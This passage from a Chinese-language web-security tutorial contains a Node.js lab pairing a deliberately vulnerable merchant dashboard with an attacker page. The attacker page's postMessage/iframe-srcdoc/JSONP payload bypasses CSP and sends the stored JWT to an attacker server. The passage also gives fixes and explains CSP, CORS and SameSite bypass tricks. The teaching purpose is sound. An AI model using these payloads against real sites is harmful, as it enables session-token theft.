2. **擋下 CSPT（客戶端路徑穿越）**：凡是要拼進前端 `fetch()` URL 路徑裡的動態參數（如 `invoiceId`），在拼接前必須先過嚴格的格式白名單（例如用正規表達式 `/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i` 確認它真的是合法的 UUIDv4），明確拒絕 `.` 與 `..`，然後再包一層 `encodeURIComponent()`（千萬別以為只包 `encodeURIComponent` 就夠了，因為 `encodeURIComponent(".")` 出來還是 `"."`，如果沒先擋掉 `..`，單獨放在路徑段裡一樣會往上跳一層目錄！）。
3. **掛上跨站隔離標頭（防禦 XS-Leaks 與視窗劫持）**：幫商戶後台全面加上這四個標頭：
   - `Cross-Origin-Opener-Policy: same-origin`（COOP：跨站用 `window.open()` 打開你時直接切斷 `window.opener` 與視窗參照，同時廢掉跨站 `postMessage` 投毒與 `win.frames.length` 側通道）
   - `Cross-Origin-Resource-Policy: same-origin`（CORP：禁止外站用 `<script>` 或 `<img>` 偷載你的 API）
   - `Content-Security-Policy: frame-ancestors 'none'`（禁止外站用 `<iframe>` 嵌入）
   - `X-Content-Type-Options: nosniff`

---

## 動手做

- **難度**：挑戰
- **預估時間**：60 分鐘

在這個實驗裡，我們只要用**單一一個 Node.js 檔案**（零外部套件依賴），就能在本機同時跑起 NexusPay 商戶後台（`http://localhost:8080`）與攻擊者的釣魚網站（`http://127.0.0.1:9090`，因為 host 不同，在瀏覽器眼裡是標準的跨來源 Cross-Origin）。

這座靶機串起了我們剛剛講的三個真實破口：商戶後台監聽 `postMessage` 時忘了檢查 `event.origin` 就直接寫進 `innerHTML`；雖然後台掛了 `default-src 'self'; script-src 'self'` 的 CSP，卻因為同源底下留了一支舊版報表 JSONP 端點 `/api/v1/export?callback=...`，讓攻擊者能隔空偷走商戶放在 `localStorage` 裡、有效期 `900 s` 的 JWT。

### 步驟 1：建立並執行本地客戶端攻擊鏈靶機

把下面這段程式碼存成 `nexuspay-client-lab.js`，並在終端機執行 `node nexuspay-client-lab.js`：

```javascript
// nexuspay-client-lab.js
const http = require("http");
const crypto = require("crypto");
const url = require("url");

// 目標商戶後台 (localhost:8080) 與 跨源攻擊站 (127.0.0.1:9090)
const targetServer = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);

  if (parsed.pathname === "/dashboard") {
    res.writeHead(200, {
      "Content-Type": "text/html; charset=utf-8",
      // 看似嚴格的白名單 CSP：只准載入同源 ('self') 腳本，完全禁止 inline script
      "Content-Security-Policy": "default-src 'self'; script-src 'self'; object-src 'none'",
    });
    return res.end(`<!DOCTYPE html>
<html>
<body>
  <h1>NexusPay 商戶後台</h1>
  <div id="notice">等待 OAuth 授權狀態...</div>
  <script src="/app.js"></script>
</body>
</html>`);
  }

  if (parsed.pathname === "/app.js") {
    res.writeHead(200, { "Content-Type": "application/javascript" });
    return res.end(`
      // 模擬商戶登入後存放在 localStorage 的 JWT（基準有效期 900 s）
      localStorage.setItem("nexus_jwt", "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJtZXJjaGFudF8xMDAxIiwiZXhwIjoxNzAwMDAwOTAwfQ.sig_demo");
      window.addEventListener("message", (event) => {
        // 破口 1：沒檢查 event.origin！
        // 破口 2：直接把外部傳來的 html 塞進 innerHTML！
        if (event.data && event.data.type === "AUTH_MSG") {
          document.getElementById("notice").innerHTML = event.data.html;
        }
      });
    `);
  }

  // 破口 3：同源 ('self') 底下殘留的舊版報表 JSONP 端點（只過濾了 < 跟 >）
  if (parsed.pathname === "/api/v1/export") {
    const cb = (parsed.query.callback || "cb").replace(/[<>]/g, "").slice(0, 96);
    res.writeHead(200, { "Content-Type": "application/javascript" });
    return res.end(`${cb}({"balance":10000});`);
  }

  res.writeHead(404).end("Not Found");
});

const evilServer = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  if (parsed.pathname === "/steal") {
    console.log("[!] 成功偷到商戶 JWT:", parsed.query.t);
    return res.writeHead(200).end("Captured!");
  }
  res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
  res.end(`<!DOCTYPE html>
<html>
<body>
  <button id="go">點我領取 NexusPay 商戶手續費優惠</button>
  <script>
    document.getElementById("go").onclick = () => {
      const win = window.open("http://localhost:8080/dashboard");
      setTimeout(() => {
        // 實戰技巧：根據 HTML5 規範，直接塞進 innerHTML 的 <script> 標籤不會執行！
        // 所以我們先塞一個 <iframe srcdoc="..."> 建立同源子文件（它會繼承父頁 CSP 並執行裡面的 <script src>），
        // 再利用同源 JSONP 端點執行 top.location 頂層視窗導航，把 parent.localStorage.nexus_jwt 帶出來！
        const payload = '<iframe srcdoc="<script src=\\'/api/v1/export?callback=top.location=\\\\\\'http://127.0.0.1:9090/steal?t=\\\\\\'%2Bparent.localStorage.nexus_jwt;//\\'></script>"></iframe>';
        win.postMessage({ type: "AUTH_MSG", html: payload }, "*");
      }, 800);
    };
  </script>
</body>
</html>`);
});

targetServer.listen(8080, () => console.log("Target running on http://localhost:8080/dashboard"));
evilServer.listen(9090, () => console.log("Evil   running on http://127.0.0.1:9090/"));
```

打開瀏覽器連上 `http://127.0.0.1:9090/`，點一下那顆按鈕，看著新開的商戶後台分頁在 0.8 秒後瞬間跳轉，而你的終端機當場印出 `[!] 成功偷到商戶 JWT: eyJhbGci...`！請仔細體會程式碼註解裡寫的：為什麼直接往 `innerHTML` 塞 `<script src=...>` 沒反應，包一層 `<iframe srcdoc="...">` 就活過來了？

### 步驟 2：套用四層縱深防禦修補靶機

接著請動手修改 `targetServer` 與 `/app.js`，一次補上四道防線：
1. 每次請求用 `crypto.randomBytes(16).toString("base64")` 產生 128-bit Nonce，把 CSP 換成 `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`，並加上 `Cache-Control: no-store`。
2. 加上 `Cross-Origin-Opener-Policy: same-origin` 標頭，直接切斷跨站 `window.open` 的視窗參照。
3. 在 `/app.js` 的 `message` 監聽器開頭嚴格比對 `event.origin`，並把 `innerHTML` 換成純文字的 `textContent`。
4. 拔掉舊版 JSONP 的 `callback` 拼接，改成回傳純 `application/json`。

改完重跑一次，確認不管從哪一層看，這條攻擊鏈都被徹底封死。

### 外部靶場對照檢查點（PortSwigger Web Security Academy）

本地實驗過關後，強烈推薦到 **PortSwigger Web Security Academy** 挑戰下面四個主題的 Practitioner / Expert 關卡（這裡只點出破關思維卡點）：

1. **XSS / CSP Bypass**（檢查點：*Reflected XSS protected by very strict CSP, with dangling markup attack* 或 *CSP bypass*）：當 `script-src` 真的鎖死、完全找不到 JSONP 時，別忘了看一眼 CSP 標頭裡有沒有 `report-uri` 或沒鎖到的 `form-action`；或者能不能用「沒閉合的 HTML 引號」（Dangling Markup，例如 `<img src='https://evil/?`）把後面那一段包含 CSRF Token 的 HTML 原始碼當成網址參數吞進去帶走。
2. **CORS**（檢查點：*CORS vulnerability with trusted insecure protocols*）：當你發現後端的 CORS 白名單信任了 `http://` 明文子網域或 `null` Origin 時，不要只停在用 `curl` 測標頭。想想看怎麼先在那個沒加密的 `http://` 子網域找一個 XSS，再從那個子網域發起帶憑證的 `fetch()` 去讀主站的核心 API。
3. **DOM-based vulnerabilities**（檢查點：*DOM XSS using web messages and JSON.parse*）：打開瀏覽器 DevTools 的 Sources 面板，看到頁面有註冊 `addEventListener("message", ...)`，就順著它的 `switch / if` 分支追下去，看哪一個分支把解析出來的屬性塞進了 `location.href`、`innerHTML` 或動態建立的 `<script>` / `<iframe>`。
4. **CSRF / SameSite**（檢查點：*SameSite Lax bypass via cookie refresh* 與 *Method override*）：遇到沒明確寫出 `SameSite` 屬性的 Cookie 時，先找找看網站上有沒有像 `/oauth-login` 這樣能透過頂層跳轉重新觸發 `Set-Cookie` 的端點；用 `window.open()` 幫受害者刷新 Cookie 後，算準在 **120 秒寬限期**內立刻送出跨站 `POST` 表單！

---

### 參考解答

#### 1. 為什麼實驗裡要用 `<iframe srcdoc="...">` 搭配 `top.location`？

這裡藏了兩個實戰常考的瀏覽器細節：
第一，HTML5 規範明文規定，透過 `element.innerHTML = "<script src='...'></script>"` 動態塞進 DOM 的 `<script>` 標籤**一律不會被執行**。平常打無 CSP 的網站時，我們會改塞 `<img src=x onerror=alert(1)>`，但這題有 `script-src 'self'` 擋住了所有 inline `onerror` 事件！這時 **`<iframe srcdoc="...">`** 就是救星：它會在同一個 Origin 底下開出一份全新的子文件，這份子文件不但會**繼承父頁面的 CSP（所以允許載入 `'self'` 的 JSONP 腳本）**，而且在解析 `srcdoc` 字串時會像正常載入網頁一樣**執行裡面的 `<script src=...>` 標籤**！
第二，因為子文件裡面的 `localStorage` 跟父頁面是同源共用的（用 `parent.localStorage.nexus_jwt` 也能直接讀），最後為了避開 `default-src 'self'` 對 `fetch`、圖片與子 iframe 導航（`frame-src`）的限制，我們直接在 JSONP 回呼裡對 **`top.location`** 賦值，觸發不受 `default-src` 限制的最頂層視窗導航，一舉把 Token 帶到 `http://127.0.0.1:9090/steal`。

#### 2. 四層縱深修補後的完整 `targetServer` 程式碼

```javascript
const targetServer = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);

  if (parsed.pathname === "/dashboard") {
    // 1. 每次請求動態產生 16 bytes (128-bit) CSPRNG Nonce
    const nonce = crypto.randomBytes(16).toString("base64");
    res.writeHead(200, {
      "Content-Type": "text/html; charset=utf-8",
      "Cache-Control": "no-store",
      // 2. 加上 COOP 切斷跨站 window.open 的視窗參照
      "Cross-Origin-Opener-Policy": "same-origin",
      // 3. 部署 Nonce + 'strict-dynamic' 的 Strict CSP，淘汰網域白名單
      "Content-Security-Policy": `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`,
    });
    return res.end(`<!DOCTYPE html>
<html>
<body>
  <h1>NexusPay 商戶後台</h1>
  <div id="notice">等待 OAuth 授權狀態...</div>
  <script nonce="${nonce}" src="/app.js"></script>
</body>
</html>`);
  }

  if (parsed.pathname === "/app.js") {
    res.writeHead(200, { "Content-Type": "application/javascript" });
    return res.end(`
      localStorage.setItem("nexus_jwt", "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJtZXJjaGFudF8xMDAxIiwiZXhwIjoxNzAwMDAwOTAwfQ.sig_demo");
      window.addEventListener("message", (event) => {
        // 4. 嚴格全等核對信任的認證中心 Origin，並改用純文字 textContent 匯點
        if (event.origin !== "http://auth.localhost:8080") return;
        if (event.data && event.data.type === "AUTH_MSG" && typeof event.data.text === "string") {
          document.getElementById("notice").textContent = event.data.text;
        }
      });
    `);
  }

  res.writeHead(404).end("Not Found");
});
```

重啟伺服器再點一次釣魚按鈕，你會發現：第一關 `Cross-Origin-Opener-Policy: same-origin` 就直接讓跨站 `window.open` 拿不到任何可以發 `postMessage` 的視窗參照（如果真實業務需要讓主視窗自己彈出跨源 OAuth 小視窗並收訊息，可改設為 `Cross-Origin-Opener-Policy: same-origin-allow-popups`）；就算退一萬步拿掉 COOP，第二關 `event.origin` 白名單與第三關 `textContent` 也會把訊息擋死；再退一萬步就算頁面其他地方出現 HTML 注入，沒有當次隨機 `nonce` 的 `<script>` 標籤在第四關 Strict CSP 面前也完全動彈不得。

---

## 自我檢核

- **難度**：進階
- **預估時間**：25 分鐘

先別看下面的解答，試著用這章學到的瀏覽器邊界規則，回答以下 5 個真實審計問題：

1. **不同埠號的 SOP 與 Cookie 糾葛**：請問 `https://app.nexuspay.example`（預設 `443` 埠）跟同台主機上的 `https://app.nexuspay.example:8443` 算不算**同源**（Same-Origin）？如果前者種了一顆沒特別寫 `Domain` 與 `SameSite` 屬性（只有 `Path=/; Secure`）的 Session Cookie，當瀏覽器去打開 `:8443` 埠的網頁時，這顆 Cookie 會不會被自動帶過去？為什麼？
2. **`Origin: null` 的真實來源**：某位後端同事在寫 CORS 中介層時，把 `"null"` 加進了允許的 `Origin` 白名單，並開啟 `Access-Control-Allow-Credentials: true`。他的理由是：「只有工程師在本機打開 `file://` 測試檔時，`Origin` 才會是 `null`，一般線上網站的 `Origin` 都是 `https://...`，所以絕對安全！」請問他的假設錯在哪裡？攻擊者要怎麼在線上網站打出 `Origin: null` 的請求？
3. **CSP 路徑白名單遇上 302 重導向**：某個頁面的 CSP 設成了 `script-src 'self' https://static.nexuspay.example/v1/trusted/; object-src 'none'`。你發現主站（`'self'`）上面有一支開放重導向 API `/goto?url=...`。請問：
   - 如果你注入 `<script src="/goto?url=https://evil.example/hack.js"></script>`，瀏覽器會不會執行？
   - 如果你改注入 `<script src="/goto?url=https://static.nexuspay.example/old/jsonp.js"></script>`，瀏覽器會不會執行？為什麼？
4. **消失的 `SameSite` 防護**：為什麼現代 Chromium 瀏覽器明明已經把未標註 `SameSite` 的 Cookie 預設當成 `SameSite=Lax` 處理了，剛登入完的前 2 分鐘內卻還是會被跨站 `<form method="POST">` 打出 CSRF？後端只要加哪幾個字就能徹底關掉這扇後門？
5. **CSPT（客戶端路徑穿越）與 `encodeURIComponent` 的盲點**：某個 SPA 前端這樣寫：
   `const docId = new URLSearchParams(location.search).get("doc");`
   `fetch(\`/api/v1/docs/${docId}/detail\`);`
   請問當攻擊者把網址改成 `?doc=..%2Fadmin%2Fkeys%23` 時，瀏覽器最後實際送出的 HTTP 請求路徑長什麼樣子？如果開發者修補時只把它改成 `fetch(\`/api/v1/docs/${encodeURIComponent(docId)}/detail\`)`，有沒有辦法擋住所有路徑段跳轉？

---

### 參考解答

1. **不同埠號的 SOP 與 Cookie 糾葛**：
   - **兩者不同源（Cross-Origin），但那顆 Cookie 照樣會被帶去給 `:8443`！**
   - 原因：同源政策（SOP）看的是 `(scheme, host, port)` 三元組，`443` 跟 `8443` 的 port 不同，所以 `:8443` 的 JS 不能直接去讀 `:443` 視窗的 DOM；但是 **Cookie 的作用域完全不管連接埠（Port）**，而且「同站」（Same-Site）只看 `scheme` + `eTLD+1`（`https://nexuspay.example`）。既然兩邊的主機名都是 `app.nexuspay.example`，又屬於同站，當瀏覽器導航去 `:8443`（或是發起帶 `credentials: "include"` 的請求）時，就會把 `:443` 的 Session Cookie 原封不動附上去。
2. **`Origin: null` 的真實來源**：
   - 錯在以為只有本機 `file://` 才會產生 `Origin: null`。根據 HTML 規範，**任何線上惡意網站**只要在頁面裡放一個不帶 `allow-same-origin` 屬性的沙箱框架 `<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://api...', {credentials:'include'})...</script>"></iframe>`（或是利用 `data:` URI），瀏覽器就會發給這個沙箱一個**不透明來源（Opaque Origin）**，它發出去的所有跨站請求，`Origin` 標頭通通都是字面上的 `"null"`！只要目標 Cookie 允許跨站附送（如 `SameSite=None; Secure`），沙箱裡的腳本就能直接把回應讀出來。
3. **CSP 路徑白名單遇上 302 重導向**：
   - **第一個會被 CSP 擋下，但第二個會成功繞過 `/v1/trusted/` 路徑限制並執行！**
   - 原因：這兩筆請求一開始都是打向同源 `'self'` 的 `/goto`，所以初始請求都會被 CSP 放行。接著遇到 HTTP 302 重導向時，根據 **W3C CSP Level 3 規範 §6.2**，瀏覽器對重導向後的目標網址**會直接跳過路徑（path）比對，只檢查重導向目標的 `scheme`、`host` 與 `port` 有沒有在白名單裡**。第一個跳去 `evil.example` 不在允許的主機清單內，當場攔截；第二個跳去 `https://static.nexuspay.example/old/jsonp.js`，雖然路徑不在 `/v1/trusted/` 底下，但它的主機跟協定符合白名單條目，重導向後瀏覽器忽略路徑限制，直接放行執行！
4. **消失的 `SameSite` 防護**：
   - 因為 Chromium 瀏覽器針對「**沒有明確寫出 `SameSite` 屬性、只靠瀏覽器套用預設值**」的 Cookie，留了一個 **`Lax + POST` 120 秒（2 分鐘）寬限期例外**：只要這顆 Cookie 剛建立或剛刷新不滿 `120 秒`，跨站頂層 `<form method="POST">` 表單導航依然會帶上它。
   - **修法**：後端在回傳 `Set-Cookie` 標頭時，明確把 **`SameSite=Lax`**（或 **`SameSite=Strict`**）這幾個字寫出來，瀏覽器就會立刻取消 120 秒例外；同時建議搭配後端檢查 `Sec-Fetch-Site` 標頭與 Anti-CSRF Token。
5. **CSPT（客戶端路徑穿越）與 `encodeURIComponent` 的盲點**：
   - 瀏覽器實際送出的請求會變成 **`GET /api/v1/admin/keys`**！因為 `URLSearchParams.get("doc")` 會先把 `%2F` 解碼成 `/`、把 `%23` 解碼成 `#`，拼進字串變成 `"/api/v1/docs/../admin/keys#/detail"`；接著瀏覽器發請求前解析 URL，`#` 把後面的 `/detail` 截斷成不會送給伺服器的 Fragment，而 `../` 則往上消掉一層 `docs/`，直接打向 `/api/v1/admin/keys`。
   - **只加 `encodeURIComponent(docId)` 還不夠安全**：雖然 `encodeURIComponent` 會把 `/` 跟 `#` 編碼成 `%2F` 與 `%23`，但它**不會編碼點號 `.`**！如果某支 API 的路徑長得像 `/api/v1/docs/${encodeURIComponent(docId)}`（參數在最後一段），或是攻擊者傳入 `?doc=..`，拼出來變成 `/api/v1/docs/../detail`，瀏覽器一樣會把 `..` 歸約成 `/api/v1/detail`；更別提很多後端反向代理收到 `%2e%2e%2f` 會自己再解碼一次。所以前端把變數拼進 URL 路徑前，一定要先用**嚴格格式白名單（如 UUID 正規表達式）並明確拒絕 `.` 與 `..`**。

---

## 延伸閱讀

- **W3C Content Security Policy Level 3**（https://www.w3.org/TR/CSP3/）：官方規格書，特別值得細讀 Section 6 *Matching Source Expressions* 裡面關於重導向後為何略過路徑比對、以及 `'strict-dynamic'` 的精確行為。
- **WHATWG HTML & Fetch Living Standard — Origin & `postMessage`**（https://html.spec.whatwg.org/multipage/origin.html）：弄懂 Tuple Origin vs Opaque Origin（`"null"`）、Site（`scheme + eTLD+1`）與 `window.postMessage` 安全邊界的最權威文件。
- **XS-Leaks Wiki**（https://xsleaks.dev/）：由 Google 安全研究團隊與社群共同維護的跨站側通道百科全書，詳細拆解了 `frames.length`、事件差異、時間側通道以及 COOP / CORP / Fetch Metadata 的防禦對照表。
- **MDN Web Docs — Trusted Types API 與 Cross-Origin-Opener-Policy (COOP)**（https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API）：手把手教你怎麼在現代前端專案裡開啟 Trusted Types，從根源把 DOM XSS 匯點鎖死。
- **PortSwigger Web Security Academy — Client-side Topics**（https://portswigger.net/web-security/all-topics）：包含 DOM XSS、`postMessage`、CORS、CSP 繞過與 `SameSite` CSRF 例外的完整線上實戰靶場。

